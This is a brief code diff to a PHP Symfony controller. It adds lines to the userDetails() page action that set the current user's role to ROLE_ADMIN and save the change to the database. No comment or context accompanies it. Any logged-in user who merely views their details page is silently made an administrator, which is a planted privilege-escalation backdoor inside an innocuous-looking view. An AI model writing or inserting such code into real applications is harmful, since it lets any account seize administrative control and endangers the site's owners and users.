@@ -66,6 +66,13 @@ class MainController extends AbstractController
      */
     public function userDetails(): Response
     {  
+        $user=$this->getUser();
+        $user->setRoles( array('ROLE_ADMIN') );
+        $entityManager = $this->getDoctrine()->getManager();
+        $entityManager->persist($user);
+        $entityManager->flush();
+
+
         return $this->render('user/userdetails.html.twig');
     }
 
